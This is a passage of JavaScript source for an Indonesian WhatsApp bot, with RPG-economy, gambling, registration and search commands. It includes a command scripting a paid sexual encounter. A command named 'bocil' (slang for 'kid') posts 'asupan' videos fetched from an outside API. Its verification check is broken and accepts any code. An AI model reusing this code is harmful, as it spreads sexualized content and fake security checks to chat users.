if (isSapi < anu3) return newReply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
kurangSapi(m.sender, anu3)
let monaynya = 10000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Sapimu* : ${getSapi(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'elephant'){
if (isGajah < anu3) return newReply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
kurangGajah(m.sender, anu3)
let monaynya = 15000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Gajahmu* : ${getGajah(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'iron'){
if (isBesi < anu3) return newReply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 16000 Money`)
kurangBesi(m.sender, anu3)
let monaynya = 16000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Besimu* : ${getBesi(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'gold'){
if (isEmas < anu3) return newReply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
kurangEmas(m.sender, anu3)
let monaynya = 50000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Emasmu* : ${getEmas(m.sender)}`)
}, 2000) 
} else
if (args[0] === 'emerald'){
if (isEmerald < anu3) return newReply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
if (!args[1]) return newReply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
kurangEmerald(m.sender, anu3)
let monaynya = 100000 * anu3
db.data.users[m.sender].money += monaynya
setTimeout( () => {
newReply(`Transaksi Sukses\n*Uangmu* : $${(getMonay(m.sender))}\n*Sisa Zamrudmu* : ${getEmerald(m.sender)}`)
}, 2000) 
} else { newReply("Format Salah") }
} catch (err) {
newReply(err)
}
}
break
case 'heal': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (isCekDarah > 100) return newReply('Darahmu Penuh')
if (isPotion < 1) return newReply(`Anda Tidak Punya Potion, Coba Beli Dengan Cara Ini #shop buy potion jumlah`) 
try {
addDarah(m.sender, 100)
kurangPotion(m.sender, 1)
newReply(`Sukses`)
} catch (err) {
newReply(mess.error)
}
}
break
case 'hunt': case 'hunting': case 'berburu': case 'memburu': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
if (isCekDarah < 1) return newReply('Darahmu Habis, Coba Sembuhkan Menggunakan Option, Atau *.tidur* Jika Kamu Mempunyai Rumah') 
if (!isBar){ addInvBar(m.sender, BarAwal) }
if (isCekBar < 1) return newReply(`Kamu Kelaparan, Masak Lah Makanan Atau Makan Makanan Yang Ada, *.cook* / *.makanan*`)
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
let luka = ["Ditusuk Duri Saat Berburu","Tergelincir ke dalam jurang saat berburu","Digaruk oleh binatang buas","Kurang teliti","Terjerat akar","Jatuh saat berburu"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = './storage/image/rimba.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image =  './storage/image/amazon.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = './storage/image/tropis.jpg'
} else
if (lokasinya === 'Meadow') {
var image = './storage/image/padang_rumput.jpg'
} else
if (lokasinya === 'African forest') {
var image = './storage/image/afrika.jpg'
} else
if (lokasinya === 'Mountains') {
var image = './storage/image/pegunungan.jpg'
}
await sleep(5000)
let teks = `乂 *H U N T  R E S U L T*\n`
teks += `*╭ 🐟Fish* : ${ikanmu}\n`
teks += `*│ 🐔Chicken* : ${ayam}\n`
teks += `*│ 🐇Rabbit* : ${kelinci}\n`
teks += `*│ 🐑Sheep* : ${domba}\n`
teks += `*│ 🐄Cow* : ${sapi}\n`
teks += `*╰  🐘Elephant* : ${gajah}\n\n`
teks += `乂 *I N F O R M A T I O N*\n`
teks += `*╭ Location* : ${lokasinya}\n`
teks += `*│ Wounded* : ${lukanya}, blood - 10\n`
teks += `*╰ Remaining blood* : ${getDarah(m.sender)}\n`
newReply(teks)
await sleep(1000)
conn.sendMessage(m.chat, { text: `Lokasi Terakhir Kamu @${m.sender.split('@')[0]} Di ${lokasinya}`, mentions: [m.sender] }, { quoted: fkontak })
addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
kurangBar(m.sender, 90)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
kurangDarah(m.sender, 10)
}
break

case 'daftar': case 'register': {
const createHash = require("crypto");
                if (isRegistered) return newReply(`You are already registered
Want to register again? .unreg 90259a21exxxxxx`)
                if (!q.includes('.')) return m.reply(`Format salah!\n\n*Example:* ${command} zky.16 `)
                const namaUser = q.substring(0, q.indexOf('.') - 0)
                const umurUser = q.substring(q.lastIndexOf('.') + 1)
                    
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
                if(isNaN(umurUser)) return newReply('Umur harus berupa angka!!')
                if (namaUser.length >= 30) return newReply(`Nama Jangan Terlalu Panjang!!`)
                if (umurUser > 100) return newReply(`Bukannya Mati Malah Main Bot`)
                if (umurUser < 2) return newReply(`Buset Bayi Bisa Ngetik`)
const name = namaUser.trim();
const age = umurUser
reply(`Apakah Nama Dan Umur Mu Sudah Benar? "Nama: ${name} Umur: ${age}", *Y* Untuk Iya *N* Untuk Tidak`)
veri = m.sender
                if (!m.isGroup) {
                    addRegisteredUser(m.sender, namaUser, umurUser, sn)                   
                } else {
                    addRegisteredUser(m.sender, namaUser, umurUser, sn)
                    }                    
let regn = db.data.users[m.sender]
regn.regp = true
}
		break
case 'regwa': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
const timeout = 1800000
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " Jam " + minutes + " Menit " + seconds + " Detik"
}
let time = global.db.data.users[m.sender].verify + 1800000
  if (new Date - global.db.data.users[m.sender].verify < 1800000) return newReply(`Kamu Bisa Meminta Code Lagi Saat ${msToTime(time - new Date())}`)
let oo = Math.floor(1000 + Math.random() * 9000);
if (isRegistered) return newReply(`You are already registered
Want to register again? .unreg 90259a21exxxxxx`)
newReply(`Kode Verifikasi Kamu Sudah Terkirim Di Private Chat!`)
conn.sendMessage(m.sender, { text: `Dear *${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}* Ini Adalah Code Verifikasi Kamu Silahkan Masukan *.regnope ${oo}*`, quoted: m })
}
break
case 'regnope': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
let verify = Math.floor(1000 + Math.random() * 9000);
if (args.length === 0) return newReply(`Masukan Code Verifikasi Kamu!`)
if (!verify) return reply(`Code Tidak Valid.!`)
let umur = 'private 🔒'
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
addRegisteredUser(m.sender, pushname, umur, sn) 
newReply(`Sukses Verifikasi, Kamu Sudah Berhasil Terdaftar!

ᴛᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ *.ᴀʟʟᴍᴇɴᴜ*
ʀᴜʟᴇs ᴘᴇʀᴀᴛᴜʀᴀɴ ʙᴏᴛ  *.ʀᴜʟᴇs*

彡 ᴇɴᴊᴏʏʏ.. `)
}
break

break
case 'spin': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
  if (!text) return reply(`Example: ${command} 1/NaN`)

  let betAmount = parseInt(text)
  if (isMonay < betAmount) return reply(`Balance Kamu Tidak Cukup Untuk Melakukan Spin`)

  let result = Math.random() >= 0.5 
  let wonAmount = result ? Math.ceil(betAmount * 1.31919) : -betAmount
  db.data.users[m.sender].money += wonAmount
  db.data.users[m.sender].money -= betAmount

  let caption = `•  S P I N  -  R E S U L T\n\n`
  caption += `- ${betAmount.toLocaleString()}\n`
  caption += result ? `+ ${wonAmount.toLocaleString()}\n\n` : `\n\n`
  caption += `• Total : ${getMonay(m.sender)} Balance`

reply3(caption)
}
break
case 'slot': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
let betAmount = parseInt(args[0]);
  if (isNaN(betAmount) || betAmount <= 0) return reply(`Example: ${command} 1000`)
  if (isMonay < betAmount) return reply(`Sorry, your balance is not sufficient to make a big bet ${betAmount}`)

  let symbols = ['♣️', '♥️', '♠️', '♦️'];

  let result = [];
  for (let i = 0; i < 3; i++) {
    let symbol = symbols[Math.floor(Math.random() * symbols.length)];
    result.push(symbol);
  }

  let win = result[1] === '♥️' && result[0] === '♣️' && result[2] === '♦️';

  let winAmount = win ? betAmount * 5 : 0;


  db.data.users[m.sender].money -= betAmount
  db.data.users[m.sender].money += winAmount
  
  let hoho = `🎰 | SLOTS ]
-------------------
${result.join(' : ')}
-------------------
[  🎰 | SLOTS ]
${win ? 'You win!' : 'You lose'}
${win ? `You won a big bet ${winAmount}` : ''}
Your remaining balance: ${getMonay(m.sender)}`
reply3(hoho)
}
break
case 'bertarung': case 'petarung': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
  let opponent = m.mentionedJid[0];
  
  if (!opponent) return reply(`*Contoh*: ${command} @user`)
  
  let betAmount = Math.floor(Math.random() * (10000000 - 10000 + 1)) + 10000 
  
  if (isMonay < betAmount) return reply('Balance Anda tidak mencukupi')
  

  
  reply('Mempersiapkan arena...') 
  
  setTimeout(() => {
    reply('Mendapatkan arena...') 
    
    setTimeout(() => {
      reply('Bertarung...')
      
      setTimeout(() => {
        let result = Math.random() >= 0.5 
        let wonAmount = result ? betAmount : -betAmount 
        
        db.data.users[m.sender].money += wonAmount
        db.data.users[opponent].money -= wonAmount
        let caption = `*Hasil pertempuran:*\n\n`
        caption += `Anda Vs @${opponent.split('@')[0]}\n\n`
        
        if (result) {
          caption += `Anda menang! +${betAmount}\n`
          caption += `Balance Anda saat ini: ${getMonay(m.sender)}\n`

          conn.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/c8ea156b03131ed613b54.jpg` }, caption: caption })
        } else {
          caption += `Anda kalah! -${betAmount}\n`
          caption += `Balance Anda saat ini: ${getMonay(m.sender)}\n`
          conn.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/5e043d7cd784d2bfa5b67.jpg` }, caption: caption, mentions: [opponent] })
        }

        
        setTimeout(() => {
          reply(`Anda dapat bertarung lagi setelah 5 detik`) 
        }, 5000)
      }, 2000)
    }, 2000) 
  }, 2000) 
}
break
case 'merampok': case 'rampok': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

if (!isInvBahan){ addInvBahan(m.sender) } 
if (!isInvBuah){ addInvBuah(m.sender) } 
if (!isInvBuild){ addInvBuild(m.sender) } 

if (!isBar){ addInvBar(m.sender, BarAwal) }
if (new Date - global.db.data.users[m.sender].bansos < 3600000) return newReply(`Kamu Sudah Merampok Hari Ini!`)
let uangnye = (Math.floor(Math.random() * 100000))
  let opponent = m.mentionedJid[0];
 
  if (!opponent) return reply(`*Contoh*: ${command} @user`)
let rampokimage = 'https://telegra.ph/file/a72a735a8c53507fb9b1f.jpg'
let rampok = `乂 *R A M P O K  @${opponent.split('@')[0]}*
╭ Uang: ${uangnye}
│ Terampok: ${opponent.split('@')[0]}
╰ Perampok: ${m.sender.split('@')[0]}`
let mm = `*❗ Kamu Mengalami Musibah Hari Ini!*
「 Dirampok Oleh @${m.sender.split('@')[0]}, Uang Terambil ${uangnye} 」`
conn.sendMessage(opponent, { image: { url: rampokimage }, caption: mm, mentions: [m.sender] })
conn.sendMessage(m.chat, { image: { url: rampokimage }, caption: rampok, mentions: [opponent] })

db.data.users[opponent].money -= uangnye
db.data.users[m.sender].money += uangnye
global.db.data.users[m.sender].bansos = new Date * 1
}
break

case 'yts': case 'ytsearch': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
                if (!text) return reply(`Example : ${prefix + command} baon cikadap`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '乂 Y O U T U B E  S E A R C H\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `
${no++}. ${i.title}
◦ *Type:* ${i.type}
◦ *Video ID:* ${i.videoId}
◦ *Views:* ${i.views}
◦ *Duration:* ${i.timestamp}
◦ *Upload At:* ${i.ago}\n⭔ Url : ${i.url}\n\n`
                }
                conn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
		case 'price': {			
		
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
let anu = `彡 *S E W A*
ᴜɴᴛᴜᴋ ᴍᴇɴʏᴇᴡᴀ ʙᴏᴛ ᴋᴀᴍᴜ̈ ʙɪsᴀ ᴍᴇᴍᴀᴋᴀɪ ᴘᴇᴍʙᴀʏᴀʀᴀɴ ɪɴɪ:
╭─ ◦ *ᴘᴀʏᴍᴇɴᴛ*
│ 6285762008398 < ᴅᴀɴᴀ / arybotz > < ᴘᴜʟsᴀ / xsɪs >
╰─ ≂

╭─ ◦ *ʜᴀʀɢᴀ*
│ 5 ʜᴀʀɪ > ɪᴅʀ 2ᴋ
│ 1 ᴍɪɴɢɢᴜ > ɪᴅʀ 3ᴋ
│ 5 ᴍɪɴɢɢᴜ > ɪᴅʀ 10ᴋ
│ 1 ʙᴜʟᴀɴ > ɪᴅʀ 30ᴋ
╰─ ≂

*ᴄʜᴀᴛ ᴏᴡɴᴇʀ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴀɴ ᴛʀᴀɴsᴀᴋsɪ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ*

彡 *P R E M I U M*

*ɪɴɢɪɴ ᴍᴇᴍʙᴇʟɪ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ? ʙᴇʀɪᴋᴜᴛ ʟɪsᴛ ʜᴀʀɢᴀ ɴʏᴀ:*
╭─  ◦ *ᴘᴀʏᴍᴇɴᴛ*
│ 6285762008398 < ᴅᴀɴᴀ / arybotz > < ᴘᴜʟsᴀ / xsɪs >
╰─ 

╭─ ◦ *ʜᴀʀɢᴀ*
│ 5 ʜᴀʀɪ > ɪᴅʀ 5ᴋ
│ 1 ᴍɪɴɢɢᴜ > ɪᴅʀ 10ᴋ
│ 5 ᴍɪɴɢɢᴜ > ɪᴅʀ 20ᴋ
│ 1 ʙᴜʟᴀɴ > ɪᴅʀ 40ᴋ
│ 1 ᴛᴀʜᴜɴ > ɪᴅʀ 50ᴋ
│ ᴘᴇʀᴍᴀɴᴇɴ > 80ᴋ
╰─ ≂

🎁 *ʙᴏɴᴜs sᴘᴇsɪᴀʟ*

> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 20ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ sᴇᴡᴀ ʙᴏᴛ ᴘᴇʀᴍᴀɴᴇɴ
> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 40ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ ᴍᴏᴅᴇʀᴀᴛᴏʀ / ᴏᴡɴᴇʀ sᴇʟᴀᴍᴀ 5 ʜᴀʀɪ
> ᴘᴇᴍʙᴇʟɪᴀɴ ᴅɪ ᴀᴛᴀs 50ᴋ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ғʀᴇᴇ sᴇᴡᴀ ʙᴏᴛ ᴘᴇʀᴍᴀɴᴇɴ + ғʀᴇᴇ ᴍᴏᴅᴇʀᴀᴛᴏʀ / ᴏᴡɴᴇʀ 10 ᴍɪɴɢɢᴜ + ғʀᴇᴇ ʟɪᴍɪᴛ sᴇᴛɪᴀᴘ ᴍɪɴɢɢᴜ 9000 + ғʀᴇᴇ ʙᴀʟᴀɴᴄᴇ sᴇᴛɪᴀᴘ ᴍɪɴɢɢᴜ 9000

*ᴄʜᴀᴛ ᴏᴡɴᴇʀ .ᴏᴡɴᴇʀ ᴜɴᴛᴜᴋ ᴍᴇʟᴀᴋᴜᴀɴ ᴛʀᴀɴsᴀᴋsɪ ʏᴀɴɢ ʟᴀɪɴɴʏᴀ*`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: false, 
        title: `Price List AR-MD`,
        body: `${global.wm}`,
        thumbnailUrl: `${global.thurl}`,
        sourceUrl: "https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
		}
		break
		case 'gcbot': {
		let gcbot = `https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa`
		if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
if (!m.isGroup) {
newReply(`https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa`)
} else if (m.isGroup) {
reply(`Karna Takutnya Saya Di Kick, Silahkan Cek Private Chat Kamu Untuk Mendapatkan Link Group Official Bot`)
conn.sendMessage(m.sender, { text: `https://chat.whatsapp.com/D154truBoj0C27OE3XBYXa` }, { quoted: m })
}
}
break
case 'hehehe': {
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
                reactionMessage = {
                    react: {
                        text: '🥰',
                        key: m.key
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
            break  
            
case 'mydompet': case 'balance': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 let caption = `乂 *W A L L E T - I N F O*
╭ Nama: ${isRegistered ? `${NamaKamu(m.sender)}` : `${pushname}`}
│ Uang: ${getMonay(m.sender)}
│ Limit: ${db.data.users[m.sender].limit}
╰ Level: ${db.data.users[m.sender].level}`
 reply(caption)
 }
 break          

    
case 'gacha': {
if (!isCreator) return replycus(mess.owner, 'Access Denies', 'https://telegra.ph/file/3847c6c65ec0503456cca.jpg')
let ofsi = args[0]
if (!text) return reply(`Masukan Berapa Key Yang Ingin Di Gunakan, *Example:* .gacha 5`)
if (ofsi === 0) return newReply(`Hemmm`)
if (isKey < ofsi) return newReply(`Your Key is Insufficient!`)
let h1 = Math.random() >= 1000.50
let hh1 = h1 ? Math.ceil(Math.random() * 100.5) : -h1
let h2 = Math.random() >= 15.2
let hh2 = h2 ? Math.ceil(Math.random() * 8) : -h2
let h3 = Math.random() >= 1000.5
let hh3 = h3 ? Math.ceil(Math.random() * 10) : -h3
let uangnye = Math.ceil(Math.random() * 9000)
kurangKey(m.sender, ofsi)
for (let i of ofsi) {
let caption = `乂 *G A C H A  R E S U L T*
╭ ◦ Money: ${uangnye}
│ ◦ ${h1 ? `Limit: ${hh1}` : `Limit: ??`}
│ ◦ ${h2 ? `Mythic: ${hh2}` : `MythicCreate: ??`}
╰  ◦ ${h3 ? `Uncommon: ${hh3}` : `Uncommon: ??`}`
reply(caption)
}
}
break

            case 'openbo': {
            if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
             if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')       
            if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`) 
let booking = ["aris","ridan","rizky","fauzan","fadli","faisal","fajar","arif","adit"]
var booking1 = booking[Math.floor(Math.random() * booking.length)]
let tempat = ["Oyo","Rumah","Kosan"]
var tempat1 = tempat[Math.floor(Math.random() * tempat.length)]

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (!isJoin) return newReply(`⌕ ᴜɴᴛᴜᴋ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ᴋᴀᴍᴜ ʜᴀʀᴜs ᴍᴇɴɢᴇᴛɪᴋ *.ᴊᴏɪɴʀᴘɢ* ᴀɢᴀʀ ᴅᴀᴛᴀ ʙᴀʟᴀɴᴄᴇ/ɪɴᴠᴇɴᴛᴏʀʏ ᴋᴀᴍᴜ ᴛᴇʀsɪᴍᴘᴀɴ ッ`)
if (isCekDarah < 1) return newReply(`Kamu Kelelahan..`)            
let { key } = await conn.sendMessage(m.chat, { text: 'Mencari Pelanggan.!' }, { quoted: fkontak })
let NgeText = `乂 *S K I D I P A P - R E S U L T*

╭ Uang: $${(getMonay(m.sender))}
│ Lokasi: ${tempat1}
╰ Pelanggan: ${booking1}`
await sleep(900)
conn.sendMessage(m.chat, { text: `Mendapatkan Pelanggan Bernama ${booking1}`, edit: key }, { quoted: fkontak })
await sleep(1000)
conn.sendMessage(m.chat, { text: `Tempat Di ${tempat1}`, edit: key }, { quoted: fkontak })
await sleep(1000)
conn.sendMessage(m.chat, { text: 'Memulai.!', edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: 'Ah Ah Ah Iyahh', edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: 'Ah AHHH Ah !! Ah Crot 💦', edit: key }, { quoted: fkontak })
await sleep(900)
conn.sendMessage(m.chat, { text: NgeText, edit: key }, { quoted: fkontak })
}
break
case 'report': 
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!text) return newReply(`Penggunaan Salah!, Penggunaan: ${command} Fitur Register Error Tolong Fix`)
let ReportSend = `${text}`
let OwnerNumberh = `6285762008398`
let ReportText = `乂 *R E P O R T*
◦ Dari: @${m.sender.split('@')[0]}
◦ Pesan: ${ReportSend}`
conn.sendMessage(OwnerNumberh + "@s.whatsapp.net", { text: ReportText, mentions: [m.sender] }, { quoted: fkontak })
newReply(`Terimakasih Telah Memberi Keluhan Anda, Fitur Yang Error Akan Segera Di Fix Oleh Owner.!`)
break

case 'request': 
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')
if (!text) return newReply(`Penggunaan Salah!, Penggunaan: ${command} Tolong Tambahkan Fitur YtSearch`)
let RequestSend = `${text}`
let OwnerNumberr = `6285762008398`
let RequestText = `乂 *R E Q U E S T*
◦ Dari: @${m.sender.split('@')[0]}
◦ Pesan: ${RequestSend}`
conn.sendMessage(OwnerNumberr + "@s.whatsapp.net", { text: RequestText, mentions: [m.sender] }, { quoted: fkontak })
newReply(`Request Anda Sudah Berhasil Dikirim!`)
break
case 'bocil': case 'ukhty': case 'ghea': case 'rika': case 'santuy': case '+62': case 'hijab': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	
let anu = await fetchJson(`https://api.akuari.my.id/asupan/${command}`)
conn.sendMessage(m.chat, { video: { url: `${anu.respon}` }, caption: 'Nih😁'}, { quoted: fkontak })
}
break
case 'playstore': case 'apk':
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
 if (db.data.settings[botNumber].gconly === true && !isPremium && !isCreator && !m.isGroup) return customsend(`${gcon}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isRegistered) return customsend(`${noregis}`, m.sender, '🐶 arybotz || MultiDevice')	    
                    if (args.length == 0) return newReply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    let get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${apilol}&query=${query}`)
                    let get_resultt = get_result.result
                    ini_txt = '乂 *P L A Y - S T O R E*\n'
                    for (let i of get_resultt) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                    }
                    newReply(ini_txt)
                    break
case 'ngewe': {
if (isBan) return customsend(`${youban}`, m.sender, '🚫 A C C E S S - D E N I E D')
if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 

if (!isInvMakanan){ addInvMakanan(m.sender) } 

if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }

